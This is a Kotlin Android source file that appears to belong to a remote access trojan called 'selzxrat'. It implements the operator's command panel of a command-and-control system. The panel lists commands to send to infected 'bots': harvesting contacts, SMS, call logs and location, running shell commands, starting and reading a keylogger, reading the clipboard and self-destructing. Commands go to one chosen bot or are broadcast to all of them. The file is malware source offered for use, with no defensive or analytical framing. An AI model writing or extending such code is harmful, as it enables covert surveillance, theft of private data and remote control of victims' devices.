package com.selzxrat.v5.fragments

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ArrayAdapter
import android.widget.Button
import android.widget.EditText
import android.widget.Spinner
import androidx.fragment.app.Fragment
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.selzxrat.v5.C2Manager
import com.selzxrat.v5.R
import com.selzxrat.v5.adapters.CommandAdapter

class CommandsFragment : Fragment() {

    private lateinit var spCommandType: Spinner
    private lateinit var etPayload: EditText
    private lateinit var btnSend: Button
    private lateinit var btnBroadcast: Button
    private lateinit var recyclerView: RecyclerView
    private lateinit var adapter: CommandAdapter

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val view = inflater.inflate(R.layout.fragment_commands, container, false)

        spCommandType = view.findViewById(R.id.spCommandType)
        etPayload = view.findViewById(R.id.etPayload)
        btnSend = view.findViewById(R.id.btnSendCommand)
        btnBroadcast = view.findViewById(R.id.btnBroadcastCommand)
        recyclerView = view.findViewById(R.id.recyclerCommands)

        val cmdTypes = arrayOf(
            "get_info", "get_contacts", "get_sms", "get_call_logs", "get_location",
            "lock_screen", "unlock_screen", "send_sms", "open_url", "list_apps",
            "shell_exec", "vibrate", "torch_on", "torch_off", "alert_dialog",
            "toast", "clipboard_get", "clipboard_set", "keylogger_start",
            "keylogger_stop", "keylogger_get", "self_destruct"
        )

        spCommandType.adapter = ArrayAdapter(requireContext(), android.R.layout.simple_spinner_dropdown_item, cmdTypes)

        adapter = CommandAdapter()
        recyclerView.layoutManager = LinearLayoutManager(requireContext())
        recyclerView.adapter = adapter

        btnSend.setOnClickListener {
            val type = spCommandType.selectedItem.toString()
            val payload = etPayload.text.toString()
            // Send to selected bot — simplified: prompts for bot ID
            showBotSelector(type, payload)
        }

        btnBroadcast.setOnClickListener {
            val type = spCommandType.selectedItem.toString()
            val payload = etPayload.text.toString()
            C2Manager.broadcastCommand(type, payload)
        }

        C2Manager.onCommandReceived { cmd ->
            requireActivity().runOnUiThread { adapter.addCommand(cmd) }
        }

        return view
    }

    private fun showBotSelector(type: String, payload: String) {
        C2Manager.getBots { bots ->
            val botIds = bots.keys.toList()
            requireActivity().runOnUiThread {
                androidx.appcompat.app.AlertDialog.Builder(requireContext())
                    .setTitle("Select Bot")
                    .setItems(botIds.toTypedArray()) { _, which ->
                        C2Manager.sendCommand(botIds[which], type, payload)
                    }
                    .setNegativeButton("Cancel", null)
                    .show()
            }
        }
    }
}